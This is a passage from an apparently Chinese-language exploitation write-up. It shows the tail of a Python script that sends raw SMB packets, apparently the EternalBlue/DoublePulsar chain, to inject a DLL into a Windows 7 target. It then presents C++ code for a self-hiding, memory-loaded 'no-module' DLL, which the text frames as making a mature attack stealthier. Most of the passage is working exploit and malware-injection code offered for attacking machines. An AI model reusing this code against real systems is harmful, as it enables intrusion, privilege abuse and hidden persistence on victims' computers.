    		data = s.recv(1024)
    		print i+4,"--->",data
    		#end1
    	        step_7_data ="x00x00x00x23xFFx53x4Dx42x71x00x00x00x00x18x07xC0x00x00x00x00x00x00x00x00x00x00x00x00x00x08xFFxFEx00x08x42x00x00x00x00"
    	        s.sendall(step_7_data)
    	        data = s.recv(1024)
    	        print 7,data
    	        #end2
    	        step_8_data ="x00x00x00x27xFFx53x4Dx42x74x00x00x00x00x18x07xC0x00x00x00x00x00x00x00x00x00x00x00x00x00x08xFFxFEx00x08x42x00x02xFFx00x27x00x00x00"
    	        s.sendall(step_8_data)
    	        data = s.recv(1024)
    	        print 8,data
    	        print "------Inject dll done!------"
                    s.close()
**0x5: 永恒之蓝 + 自隐藏模块注入**
我们写的win7下的exploit功能就算基本完成了,但是如果要想完成一次成熟的攻击,
不可能注入了进程之后进程又崩掉了,dll注入是和权限有直接关系的，Doubleplusar执行后是nt权限,可以采用无模块注入来注入到受害者的机器测试后发现同时也解决进程崩掉的问题这里顺便提一下无模块注入中的一些知识。关于dll注入和
x86 x64 进程互写互读的知识有兴趣可以去看看. 这里介绍一种关于模块自隐藏的知识
:DllMain第一次执行时，申请一块内存把DLL文件进行模拟加载，然后再调用模拟加载PE的DllMain，第二次的DllMain就在非模块的内存中执行了。DLL自卸载说起来也不难，是用MOMODALMARK标记DllMain的返回值
类似于MemoryLoadLibrary 的功能
上代码:
    // dllmain.cpp : 定义 DLL 应用程序的入口点。
    #include "stdafx.h"
    #include "MemoryLoad.h"
    //创建一个进程互斥量  防止无模块DLL多次注入
    BOOL IsMutexExist(char* pstrMutex)
    {
    	BOOL bRet = FALSE;
    	HANDLE hMutex = NULL;
    	hMutex = CreateMutexA(NULL, TRUE, pstrMutex);
    	if (hMutex)
    	{
    		if (GetLastError() == ERROR_ALREADY_EXISTS)
    			bRet = TRUE;
    		ReleaseMutex(hMutex);
    		CloseHandle(hMutex);
    	}
    	else
    	{
    		bRet = TRUE;
    	}
    	return bRet;
    }
    //调用LoadPE.cpp里的函数，自行处理PE加载，把DLL在新申请的内存加载起来，并执行入口函数
    void LaunchNoModule()
    {
    	LaunchDll((char*)dllModuleName, NO_MODULE_MARK);
    }
    unsigned int  __stdcall NoModuleThread(void* lpParameter)
    {
    	while (TRUE)
    	{
    		Sleep(1000);
    		OutputDebugString(L"Test by IronMan.");
    	}
    	return TRUE;
    }
    //调用LoadPE.cpp里的函数，自行处理PE加载，把DLL在新申请的内存加载起来，并执行入口函数
    void NoModuleEntryCall(HMODULE hModule, DWORD ul_reason_for_call, char* pstrModuleName)
    {